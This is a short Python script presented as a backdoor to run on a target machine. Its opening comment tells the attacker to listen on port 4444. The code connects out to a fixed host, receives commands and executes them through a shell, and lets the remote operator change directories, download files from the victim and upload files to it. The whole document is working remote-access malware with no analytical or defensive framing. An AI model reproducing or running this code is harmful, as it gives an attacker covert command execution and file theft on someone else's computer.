#!/usr/bin/env python3
'''
Do this on hacker machine:
run executeCommandServer.py -p 4444
netcat verbose listen port 4444
Run this code on the target:
'''
import socket
import subprocess
from backdoor import Backdoor

def execute_command(command):
    output = subprocess.check_output(command, shell=True)
    return output

backdoor = Backdoor("192.168.1.199", 4444)
response_json = backdoor.recv_json(1024)
while (True):
    if "close" in response_json[0]:
        break
    try:
        if (len(response_json)>1) and ("cd" in response_json[0]):
            backdoor.send_json(backdoor.cwd_to(response_json[1]))
        elif (len(response_json)>1) and ("download" in response_json[0]):
            backdoor.send_json(backdoor.get_file(response_json[1]).decode("utf-8"))
        elif ("upload" in response_json[0]):
            print("in the loop")
            backdoor.send_json(backdoor.write_file(response_json[2], response_json[1]))
        else:
            output = execute_command(response_json)
            backdoor.send_json(output.decode("utf-8"))
    except:
        backdoor.send_json("This command is not recognized")
    response_json = backdoor.recv_json(1024)



backdoor.close()
exit()